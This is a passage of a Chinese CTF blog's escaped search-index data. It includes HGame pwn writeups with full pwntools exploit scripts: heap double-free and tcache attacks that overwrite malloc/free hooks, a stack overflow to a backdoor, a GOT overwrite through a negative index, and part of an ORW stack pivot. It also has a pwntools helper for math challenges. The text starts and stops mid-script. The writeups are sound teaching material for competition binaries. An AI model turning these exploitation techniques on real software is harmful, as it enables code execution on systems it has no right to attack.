formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) sendline_after_clean(str(size), b\u0026#34;Size: \u0026#34;) sendline_after_clean(content, b\u0026#34;Content: \u0026#34;) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0x68, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x68, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) remove(2) # gdb.attach(p) show(2) base_addr = recv_and_transform() - 0x3c4b78 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] hook_addr = base_addr + libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x23 realloc_addr = base_addr + libc.sym[\u0026#39;__libc_realloc\u0026#39;] one = [0x45226, 0x4527a, 0xf03a4, 0xf1247] one_gadget = base_addr + one[3] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) remove(0) remove(1) remove(0) allocate(4, 0x68, pg(hook_addr)*2) allocate(5, 0x68, \u0026#34;\u0026#34;) # gdb.attach(p) allocate(6, 0x68, \u0026#34;\u0026#34;) payload = b\u0026#34;\\x00\u0026#34;*0xb + pg(one_gadget) + pg(realloc_addr+6) allocate(7, 0x68, payload) # gdb.attach(p) sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(\u0026#34;8\u0026#34;, b\u0026#34;Index: \u0026#34;) sendline_after_clean(\u0026#34;0\u0026#34;, b\u0026#34;Size: \u0026#34;) interactive_after_clean() new_fast_note checksec查看程序架构 ida查看伪C代码 典型的堆菜单题，这里比较重要的是：\n虽然表面上限制分配15个chunk，但是它并不检查对应的index是否已有chunk，这导致我们可以分配任意个chunk\n再加上free后不置零，我们就可以得到libc基址：\n那么，我们有两种思路：\nunsorted bin泄露libc后往tcache bin中填入7个0x10的chunk，进行fastbin double free 泄露libc后直接tcache attack 在fast_note中我们已经详细讲过第二种方法了，这里我们使用第一种方法\n小贴士 在往tcache bin中填入0x10chunk块的时候，我们需要先分配7个chunk块，这时候，由于unsorted bin中还保留着0x80的堆块一个，所以程序会对其分割\n但是0x80的size位为0x90，只能分配成0x90=0x20*3+0x30这四个堆块，因此分配的第四个堆块的大小为0x30\n但是这样子第四个chunk释放的时候，就无法进入0x20的tcache bin，而是进入0x30的tcache bin，因此距离tcache bin被填满就刚好差一个\n因此，我们需要分配8个chunk而不是7个\n可能有点难理解，具体看我代码然后自己调试看下\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-new_fast_note\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31780\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) sendline_after_clean(str(size), b\u0026#34;Size: \u0026#34;) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(7, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(8, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) show(7) main_arena_offset = 0x1ECB80 base_addr = recv_and_transform() - main_arena_offset - 96 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] hook_addr = base_addr + libc.sym[\u0026#39;__free_hook\u0026#39;] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) allocate(0, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(7, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(9, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(10, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) # gdb.attach(p) remove(9) remove(10) remove(9) allocate(0, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) allocate(9, 0x10, pg(hook_addr)) # gdb.attach(p) allocate(10, 0x10, pg(hook_addr)) allocate(11, 0x10, pg(hook_addr)) allocate(12, 0x10, pg(system_addr)) remove(8) interactive_after_clean() ","date":"2023年01月21日","permalink":"https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/","section":"writeup","summary":"I\u0026rsquo;d rather attempt to do something great and fail than to attempt to do nothing and succeed. — Robert Schuller [上期见这里](../HGame Week1 PWN WriteUp) YukkuriSay checksec查看程序架构 发现了canary，但是这题溢出不到can","tags":["pwn","格式化字符串漏洞","tcache attack","hook edit","fastbin attack","main_arena leak"],"title":"HGame Week2 PWN WriteUp"},{"categories":null,"contents":" 隔壁老井的隔壁的博客\ra weber\u0026#39;s blog\rPara-L1las的博客\rA WEB SECURITY BLOG\r","date":"2023年01月19日","permalink":"https://peterliuzhi.top/friend/links/","section":"friend","summary":"隔壁老井的隔壁的博客 a weber\u0026#39;s blog Para-L1las的博客 A WEB SECURITY BLOG","tags":null,"title":"Links"},{"categories":["tricks"],"contents":" The only real failure in life is not to be true to the best one knows. — Buddha\n有时候misc题目会出一些连续解几百个简单数学题然后才能get flag的题目，这时候我们可以利用pwntools进行交互并使用eval解题\n注意，此脚本只能解普通数学计算式（加减乘除模，以及在python中符合语法的表达式），而一些英文计算式或者中文计算式要自己写一个转换函数将其转化为数学计算式，一般来说可以使用哈希表\nLinux中没有pwntools可以使用以下命令安装：\napt-get update apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools 具体详见Installation — pwntools 4.8.0 documentation\n以下是脚本：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 website = \u0026#34;www.example.com\u0026#34; port: str = \u0026#34;666\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) p = remote(website, port) # 下面是自定义的一些工具函数 def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) for i in range(100): # 从标准输出流获取题目 # 会一直读到b\u0026#34;.\u0026#34;为止 question = p.recvuntil(b\u0026#34;.\u0026#34;) # 工具函数自动计算结果 # 注意，输入的题目必须是有意义的算式，不能有等号 # 比如可以是1+2, 1÷2 # 如果需要小数，定义参数precise=True answer = formula_compute(question) # 在结尾加上回车发送answer # 直到读到\u0026#34;answer:\u0026#34;才开始发送 # 也可以不定义until字符串，脚本会在程序没有输出的时候发送（但如果网络不好，脚本可能判断出错） sendline_after_clean(answer, \u0026#34;answer:\u0026#34;) # 进入人机交互模式 interactive_after_clean() 脚本中的注释应该足够了\n需要注意的是，只有Linux中才能使用pwntools\n","date":"2023年01月18日","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8pwntools%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92%E8%A7%A3misc%E6%95%B0%E5%AD%A6%E9%A2%98/","section":"tricks","summary":"The only real failure in life is not to be true to the best one knows. — Buddha 有时候misc题目会出一些连续解几百个简单数学题然后才能get flag的题目，这时候我们可以利用pwntools进","tags":["misc","pwntools","解普通数学题"],"title":"使用pwntools与远程交互解misc数学题"},{"categories":["writeup","HGame"],"contents":" The greatest healing therapy is friendship and love. — Hubert Humphrey\ntest_nc nc连上远程直接cat flag\neasy_overflow checksec ida 简单的栈溢出，唯一需要注意的是在get shell前将标准输出流关掉了，但我们可以用shell命令中的重定向将标准输出流重定向到标准错误流：\nexec 1\u0026gt;\u0026amp;2 cat flag 就可以了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-vuln\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30818\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 backdoor = 0x401176 ret = 0x000000000040101a payload = flat({offset:[ ret, backdoor ]}) sendline_after_clean(payload) interactive_after_clean() choose_the_seat checksec ida 非常明显地，输入负数可以更改seats上方的任意数据\n我们可以考虑修改got表，目标是把puts的got值改成system的地址，但这首先需要泄露libc，我们可以考虑把exit的got值改成main函数的地址，然后就可以操作多次，就可以泄露libc后更改puts的got\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-choose_the_seat\u0026#34; libc_name: str = \u0026#34;libc-2.31.so\u0026#34; port: str = \u0026#34;31653\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean(b\u0026#34;-6\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(pg(0x4011D6)) sendline_after_clean(b\u0026#34;-9\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(b\u0026#34;1\u0026#34;*7+b\u0026#34;.\u0026#34;, \u0026#34;please input your name\\n\u0026#34;) puts_addr = recv_and_transform(b\u0026#34;.\u0026#34;) base_addr = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one_gadget = base_addr + 0xe3afe suclog( base_addr=base_addr ) sendline_after_clean(b\u0026#34;-9\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34; + pg(system_addr), \u0026#34;please input your name\\n\u0026#34;) interactive_after_clean() orw checksec ida 程序禁掉了execve和execveat：\n因为偏移量是0x108，能输入0x130个字符，所以只能执行五条指令：\n法一：ret2libc后栈迁移 因为原来的空间不够，我们可以考虑栈迁移到bss_end + 0x100的地方，然后就可以随便orw了\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-orw\u0026#34; libc_name:str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30527\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, 